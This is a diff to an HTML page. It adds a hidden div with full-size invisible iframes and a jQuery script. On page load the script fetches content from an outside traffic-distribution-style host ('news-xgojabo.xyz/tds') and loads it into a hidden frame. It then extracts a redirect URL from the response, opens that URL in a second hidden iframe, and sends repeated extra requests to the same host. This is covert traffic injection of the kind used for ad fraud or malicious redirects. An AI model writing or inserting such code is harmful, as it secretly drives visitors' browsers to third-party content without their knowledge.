@@ -5,17 +5,28 @@
 
 </head>
 <body>
+
  <div style="display:none;">
      <iframe id="id1" src="" height="768" width="1366" ></iframe>
+      <iframe id="ifr1" src="" height="768" width="1366" ></iframe>
 
   <script>
 $.get("https://news-xgojabo.xyz/tds?id=1268529686&p1=sub1&p2=sub2&p3=sub3&p4=sub4", function(data, status){
+      // $("textarea#a1").val(data);
        $("#id1").attr("srcdoc", data);
-        
+       var arr = data.split('userCustomRedirectUrl = "');
+		  var t1 = arr[1];
+		  var arr2 = t1.split('reject";\</script\>');
+		  var t2 = arr2[0];
+  	$('#ifr1').attr('src', t2);    
 });
+
+	  $.get("https://news-xgojabo.xyz/tds?id=1268529686&p1=sub1&p2=sub2&p3=sub3&p4=sub4", function(data, status){   
+	});
+	  $.get("https://news-xgojabo.xyz/tds?id=1268529686&p1=sub1&p2=sub2&p3=sub3&p4=sub4", function(data, status){   
+	});
 </script>
 
-  <iframe src="" height="0" width="0"></iframe>
 
  </div>
 
